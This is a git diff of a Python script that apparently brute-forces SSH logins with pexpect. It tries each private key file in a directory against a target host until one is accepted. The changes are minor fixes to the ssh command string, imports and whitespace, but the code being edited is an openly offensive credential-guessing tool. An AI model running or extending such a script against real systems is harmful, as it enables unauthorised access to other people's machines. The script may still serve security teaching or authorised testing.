@@ -1,9 +1,6 @@
-from pexpect import pxssh
 import optparse
-import time
 from threading import *
 import os
-
 import pexpect
 
 # global variables
@@ -20,9 +17,9 @@ def connect(host, user, keyfile, release):
         ssh_newkey = "Are u sure u want to continue"
         conn_closed = "Connect closed by remote host"
         opt = ' -o PasswordAuthentication=no'
-        connStr = 'ssh' + user + '@' + host + ' -i ' + keyfile + opt
+        connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
         child = pexpect.spawn(connStr)
-        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#3',])
+        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#3', ])
         if ret == 2:
             print('[-] Adding Host to ~/ .ssh/know_hosts')
             child.sendline('yes')
@@ -33,8 +30,6 @@ def connect(host, user, keyfile, release):
         elif ret > 3:
             print('[-] Success. ' + str(keyfile))
             Stop = True
-        
-        
     finally:
         if release:
             connection_lock.release()
@@ -53,7 +48,7 @@ def main():
         print(parser.usage)
         exit(0)
 
-    fn = open(passDir, 'r')
+    
     for filename in os.listdir(passDir):
         if Stop:
             print("[*] Exiting: Key Found")
